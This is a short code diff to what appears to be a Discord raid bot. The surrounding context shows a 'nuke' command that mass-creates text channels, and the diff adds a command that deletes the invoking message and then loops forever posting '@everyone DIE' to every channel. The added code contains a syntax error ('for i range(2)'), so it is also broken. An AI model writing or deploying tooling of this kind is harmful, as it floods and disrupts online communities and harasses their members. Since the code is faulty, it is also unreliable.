@@ -46,5 +46,16 @@ async def nuke (ctx):
         for channel in guild.text_channels:
             for i in range (500):
                 await guild.create_text_channel(channel_names)
-        
+ 
+
+@client.command()
+async def s(ctx):
+  guild=ctx.message.guild
+  await ctx.message.delete()
+  for i range(2):
+    print("spammed")
+    while True:
+           for channel in guild.text_channels:
+                 await channel.send("@everyone DIE")
+
 client.run(token)
